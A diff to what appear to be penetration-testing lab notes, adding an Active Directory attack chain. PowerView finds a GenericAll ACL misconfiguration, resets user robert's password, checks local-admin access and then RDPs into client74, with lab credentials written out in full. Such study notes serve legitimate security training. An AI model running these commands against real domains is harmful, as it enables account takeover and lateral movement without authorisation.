@@ -2395,7 +2395,7 @@ Reference
     ```
     apt install docker-compose
     wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz && tar -xzf ./bloodhound-cli-linux-amd64.tar.gz && rm bloodhound-cli-linux-amd64.tar.gz
-    Login: admin; ./bloodhound-cli config get default_password
+    Login: admin; Admin12345678!
 
     sudo ./bloodhound-cli install
     
@@ -4122,8 +4122,15 @@ Reference
   - Find out which new machine has administrative privileges
     `Find-LocalAdminAccess`
     `xfreerdp3 /u:stephanie /p:'LegmanTeamBenzoin!!' /d:corp.com /v:192.168.154.72 /cert:ignore /drive:share,/home/kali/share`  
-  - dd
-
+- capstones (Misconfigured GenericAll access)
+  - Find ACL misconfigurations (GenericAll-can reset password without knowing old one)/ Bloodhount > robert
+    `Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft`
+  - Reset Robert’s password
+    `Set-DomainUserPassword -Identity robert -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force)`
+  - check robert's privilege (Use PowerView to see where Robert is local admin) > client74
+    `Find-LocalAdminAccess -Credential (New-Object System.Management.Automation.PSCredential("CORP\robert",(ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force)))`  
+  - RDP to client74
+    `xfreerdp3 /u:robert /p:'NewP@ssw0rd!' /d:corp.com /v:192.168.154.74 /cert:ignore /drive:share,/home/kali/share`
 
 ## Penetration testing report 
 - note editor:
